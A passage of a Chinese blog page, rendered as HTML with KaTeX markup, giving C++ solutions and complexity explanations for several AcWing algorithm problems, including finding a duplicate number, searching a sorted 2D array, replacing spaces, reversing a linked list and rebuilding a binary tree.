class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的数组<code>nums</code>，数组中所有的数均在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \sim n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的范围内，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \ge 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p><p>请找出数组中任意一个重复的数，但不能修改输入的数组。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>给定 nums = [2, 3, 5, 4, 3, 2, 6, 7]。返回 2 或 3。</code></pre><p><strong>思考题</strong>：如果只能使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 的额外空间，该怎么做呢？</p><h3 id="抽屉原理-二分法-O-n-cdot-logn">抽屉原理 + 二分法 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p>抽屉原理: n+1个数的取值范围为[1, n], 则必有至少2个数相同</p><p>分治思想: 将<strong>取值范围</strong>总区间[1, n]按取值范围分为左右区间, 则必有1个区间中的数大于坑数(取值范围个数)</p><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>每次会将区间长度缩小一半，一共会缩小 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 次。每次统计两个子区间中的数时需要遍历整个数组，时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。所以总时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">duplicateInArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 二分的是取值范围(坑的范围)</span></span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;  <span class="comment">// nums.size() = n + 1</span></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) s += (x &gt;= l &amp;&amp; x &lt;= mid);</span><br><span class="line">      <span class="keyword">if</span> (s &gt; mid - l + <span class="number">1</span>) r = mid;</span><br><span class="line">      <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二维数组中的查找"><a href="https://www.acwing.com/problem/content/16/">二维数组中的查找</a></h2><p>在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。</p><p>请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>数据范围</strong></p><p>二维数组中元素个数范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入数组：[  [1,2,8,9]，  [2,4,9,12]，  [4,7,10,13]，  [6,8,11,15]]如果输入查找数值为7，则返回true，如果输入查找数值为5，则返回false。</code></pre><h3 id="Binary-Search-Tree-单调性扫描-O-n-m">Binary Search Tree 单调性扫描 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n + m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></h3><p>寻找突破点时可以关注边界, 此题的突破点在右上角<br>右上角同行向左的元素都比其小, 同列向下的所有元素均比其大<br>当右上角元素比target大时, 所在列都不用考虑(j–),比target小时所在行都不用考虑(i++)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">searchArray</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; array, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> n = array.<span class="built_in">size</span>(), m = array[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = m - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[i][j] == target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (array[i][j] &gt; target) j--;</span><br><span class="line">      <span class="keyword">else</span> i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="替换空格"><a href="https://www.acwing.com/problem/content/17/">替换空格</a></h2><p>请实现一个函数，把字符串中的每个空格替换成<code>&quot;%20&quot;</code>。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo></mrow><annotation encoding="application/x-tex">0 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span></span></span></span> 输入字符串的长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">\le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>。<br>注意输出字符串的长度可能大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1000</mn></mrow><annotation encoding="application/x-tex">1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;We are happy.&quot;输出：&quot;We%20are%20happy.&quot;</code></pre><h3 id="遍历添加-O-n">遍历添加 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">replaceSpaces</span><span class="params">(string &amp;str)</span> </span>&#123;</span><br><span class="line">    string res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: str) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        res += <span class="string">&quot;%20&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        res += x;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="本地修改">本地修改</h3><p>Python / Java 中字符串被设计成不可修改的，而在 C++ 中字符串是可变的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>, len = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) count++;</span><br><span class="line">    &#125;</span><br><span class="line">    s.<span class="built_in">resize</span>(len + <span class="number">2</span> * count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">1</span>, j = s.<span class="built_in">size</span>() - <span class="number">1</span>; i &lt; j; i--, j--) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        s[j] = s[i];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s[j - <span class="number">2</span>] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">        s[j - <span class="number">1</span>] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        s[j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        j -= <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="从尾到头打印链表"><a href="https://www.acwing.com/problem/content/18/">从尾到头打印链表</a></h2><p>输入一个链表的头结点，按照 <strong>从尾到头</strong> 的顺序返回节点的值。</p><p>返回的结果用数组存储。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo></mrow><annotation encoding="application/x-tex">0 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span></span></span></span> 链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">\le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[2, 3, 5]返回：[5, 3, 2]</code></pre><h3 id="解法1-翻转vector-O-n">解法1 翻转vector <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printListReversingly</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(head-&gt;val);</span><br><span class="line">      head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="解法2-辅助栈-O-n">解法2 辅助栈 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printListReversingly</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">      stk.<span class="built_in">push</span>(head-&gt;val);</span><br><span class="line">      head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">while</span> (stk.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(stk.<span class="built_in">top</span>());</span><br><span class="line">      stk.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="重建二叉树"><a href="https://www.acwing.com/problem/content/23/">重建二叉树</a></h2><p>输入一棵二叉树前序遍历和中序遍历的结果，请重建该二叉树。</p><p><strong>注意</strong>:</p><ul><li>二叉树中每个节点的值都互不相同；</li><li>输入的前序遍历和中序遍历一定合法；</li></ul><p><strong>数据范围</strong></p><p>树中节点数量范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>给定：前序遍历是：[3, 9, 20, 15, 7]中序遍历是：[9, 3, 15, 20, 7]返回：[3, 9, 20, null, null, 15, 7, null, null, null, null]返回的二叉树如下所示：    3   / \  9  20    /  \   15   7</code></pre><h3 id="题解">题解</h3><p><strong>思路</strong></p><p>先序遍历第1个对应的为根节点, 在中序遍历序列中找到其位置为k, 那么[il, k-1]为左子树的中序序列, 而[k+1, ir]为右子数的中序序列<br>根据区间长度可以确定先序遍历序列中左子树的端点, 从而递归去求解。</p><p><strong>时间复杂度</strong></p><p>在初始化时，用哈希表记录每个值在中序遍历序列中的位置，这样我们在递归到每个节点时，在中序遍历中查找根节点位置的操作，只需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 的时间。此时，创建每个节点需要的时间是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，所以总时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; pre, in;</span><br><span class="line">  map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pos;</span><br><span class="line">  <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; _preorder, vector&lt;<span class="type">int</span>&gt;&amp; _inorder)</span> </span>&#123;</span><br><span class="line">    pre = _preorder, in = _inorder;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pre.<span class="built_in">size</span>(); i++) pos[in[i]] = i;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(<span 